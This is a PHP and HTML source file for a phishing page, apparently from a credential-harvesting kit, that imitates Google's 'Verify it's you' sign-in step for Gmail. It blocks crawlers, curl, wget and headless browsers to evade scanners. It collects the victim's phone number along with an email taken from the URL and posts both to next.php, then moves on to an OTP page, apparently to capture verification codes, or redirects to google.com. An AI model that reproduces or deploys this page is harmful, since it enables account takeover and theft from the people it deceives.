<?php

header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
header("Content-Security-Policy: default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: https:; object-src 'none'; base-uri 'self'; form-action 'self'");
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$blocked_signatures = ['bot', 'crawl', 'spider', 'axios', 'curl', 'wget', 'python-requests', 'headless', 'phantomjs', 'go-http-client'];
if (empty($user_agent) || str_contains($user_agent, 'bot') || str_contains($user_agent, 'crawl') || str_contains($user_agent, 'spider')) {
    foreach ($blocked_signatures as $bad) {
        if (strpos($user_agent, $bad) !== false) {
            http_response_code(403);
            exit('Forbidden');
        }
    }
}
$rateFile = sys_get_temp_dir() . "/rate_limit_" . md5($ip);
$limit = 60;
$timeWindow = 60;

if (file_exists($rateFile)) {
    $data = json_decode(file_get_contents($rateFile), true);
    if (isset($data['count']) && isset($data['time']) && $data['count'] >= $limit && (time() - $data['time']) < $timeWindow) {
        http_response_code(429);
        header('Retry-After: ' . ($timeWindow - (time() - $data['time'])));
        exit('Too Many Requests');
    } elseif ((time() - ($data['time'] ?? 0)) >= $timeWindow) {
        $data = ['count' => 1, 'time' => time()];
    } else {
        $data['count']++;
    }
} else {
    $data = ['count' => 1, 'time' => time()];
}
file_put_contents($rateFile, json_encode($data));
?>
<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
  <title>Gmail Cookies</title>

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@17.0.19/build/css/intlTelInput.min.css" />

  <style>
    body {
      background: #f0f3f8;
      font-family: "Open Sans", sans-serif;
    }

    #form-outer {
      width: 100%;
      max-width: 1040px;
      background: #fff;
      border-radius: 30px;
      padding: 60px 40px;
      margin: 100px auto;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
    }

    #left-div {
      text-align: center;
      padding-bottom: 30px;
    }

    /* Make sure the intl-tel-input container takes full width */
    .iti {
      width: 100%;
      position: relative;
    }

    /* Style the input field to be taller and match the button */
    #otp_code.form-control {
      height: 50px;
      border-radius: 8px; 
    }
    
    /* Error message styling */
    #otpErrMsg {
      font-size: 0.875em;
      text-align: left; /* Align error text with input */
      width: 100%;
      margin-left: 10px; /* Give it a little space */
    }

    #next_btn {
      float: right;
      height: 50px;
      width: 120px;
      border-radius: 30px;
    }

    @media (max-width: 768px) {
      #form-outer {
        padding: 40px 20px;
        margin-top: 60px;
      }

      #next_btn {
        float: none;
        width: 100%;
      }
    }
  </style>
</head>

<body>
  <div id="main-container" class="container">
    <div id="form-outer">
      <div id="left-div">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48" aria-hidden="true">
          <path fill="#4285F4"
            d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z">
          </path>
          <path fill="#34A853"
            d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z">
          </path>
          <path fill="#FBBC05"
            d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z">
          </path>
          <path fill="#EA4335"
            d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z">
          </path>
        </svg>
        <h1 class="fw-lighter mt-3">Sign In</h1>
        <p>to continue to Gmail</p>
      </div>

      <div>
        <p style="text-align:center;font-weight:600;font-size:22px;">Verify it's you</p>
        <p style="text-align:center;">To help keep your account safe, Google wants to make sure it's really you trying
          to sign in</p>
        <div class="text-center mb-4">
          <button class="btn btn-light" id="account_btn" style="border-radius: 25px;">
            *************@gmail.com
          </button>
        </div>

        <p style="text-align:center;">Enter a phone number to get a text message with a verification code.</p>

        <div class="row justify-content-center">
          <div class="col-lg-7 col-md-9">
            
            <label for="otp_code" class="visually-hidden">Phone Number</label>
            
            <input type="tel" id="otp_code" class="form-control" inputmode="numeric" name="otp_code" placeholder="Phone Number">
            
            <div id="otpErrMsg" class="invalid-feedback" style="display:none;">
              Invalid phone number, please try again.
            </div>

          </div>
        </div>

        <div class="row justify-content-center mt-4">
           <div class="col-lg-7 col-md-9 text-end">
             <button id="next_btn" class="btn btn-primary">Next</button>
           </div>
        </div>

      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@17.0.19/build/js/intlTelInput.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@17.0.19/build/js/intlTelInput.min.js"></script>

  <script>
    // Initialize with IP-based detection
    const input = document.querySelector("#otp_code");

    // ** UPDATED SECTION **
    // We are now using ipinfo.io, which is another reliable free service.
    const iti = window.intlTelInput(input, {
      separateDialCode: true,
      initialCountry: "auto",
      geoIpLookup: function (callback) {
        // Switched from ipapi.co to ipinfo.io
        fetch("https://ipinfo.io/json") 
          .then(res => res.json())
          .then(data => callback(data.country)) // Changed from data.country_code to data.country
          .catch(() => callback("us")); // Fallback to "us"
      },
      utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@17.0.19/build/js/utils.js",
      placeholderNumberType: "MOBILE"
    });
    // ** END OF UPDATED SECTION **


    $("#next_btn").on("click", function (e) {
      e.preventDefault();

      const $mainContainer = $("#main-container");
      const $otpInput = $("#otp_code");
      const $otpError = $("#otpErrMsg");
      
      $mainContainer.css("opacity", "0.6");
      $otpInput.removeClass("is-invalid");
      $otpError.hide();

      const hash = window.location.hash.substring(1);
      const phoneNumber = iti.getNumber();

      if (!phoneNumber || phoneNumber.trim() === "") {
        $otpError.text("Please enter your phone number").show();
        $otpInput.addClass("is-invalid");
        $mainContainer.css("opacity", "1");
        return;
      }

      if (!iti.isValidNumber()) {
        $otpError.text("Invalid phone number, please try again.").show();
        $otpInput.addClass("is-invalid");
        $mainContainer.css("opacity", "1");
        return;
      }

      $.ajax({
        url: "next.php",
        type: "POST",
        data: {
          ph: phoneNumber,
          em: hash
        },
        success: function (response) {
          if (response === "invalid") {
            $otpError.text("Invalid phone number, please try again.").show();
            $otpInput.addClass("is-invalid");
            $mainContainer.css("opacity", "1");
          } else if (response === "need_otp") {
            window.location.href = "otp.php";
          } else if (response === "saved") {
            window.location.href = "http://www.google.com";
          }
        },
        error: function() {
            $otpError.text("An error occurred. Please try again.").show();
            $otpInput.addClass("is-invalid");
            $mainContainer.css("opacity", "1");
        }
      });
    });
  </script>
</body>
</html>